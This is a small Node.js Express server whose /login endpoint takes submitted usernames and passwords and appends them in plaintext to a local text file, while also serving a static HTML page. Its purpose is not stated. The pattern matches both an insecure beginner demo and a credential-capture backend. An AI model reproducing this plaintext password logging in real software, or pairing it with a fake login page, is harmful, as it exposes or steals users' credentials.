const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Endpoint to handle form submission
app.post("/login", (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}\n`;

    // Save data to a local file
    const filePath = path.join(__dirname, "loginData.txt");
    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error("Error saving data:", err);
            return res.status(500).send("Error saving data.");
        }
        res.send("Data saved successfully!");
    });
});

// Serve the HTML file
app.use(express.static(path.join(__dirname, "public")));

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
